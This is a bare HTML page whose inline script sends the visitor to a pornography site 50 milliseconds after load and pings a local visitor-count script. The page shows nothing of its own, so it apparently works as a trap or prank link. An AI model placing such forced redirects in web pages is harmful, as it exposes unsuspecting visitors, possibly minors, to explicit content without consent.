<!DOCTYPE html>
<html>
<head>
	<meta charset="UTF-8">
	<!-- CSS -->
	<style type="text/css">
		body {
			background-color: #f4f4f4;
			text-align: center;
		}
		h1 {
			font-size: 48px;
			margin-top: 100px;
		}
	</style>
</head>
<body>
	<!-- JavaScript -->
	<script type="text/javascript">
		setTimeout(function () {
			window.location.href = "https://fr.pornhub.com/";
		}, 50); // 0.05 seconds

		// AJAX call to the Python script
		var xhttp = new XMLHttpRequest();
		xhttp.onreadystatechange = function() {
			if (this.readyState == 4 && this.status == 200) {
				console.log(this.responseText);
			}
		};
		xhttp.open("GET", "visitor_count.py", true);
		xhttp.send();
	</script>
</body>
</html>
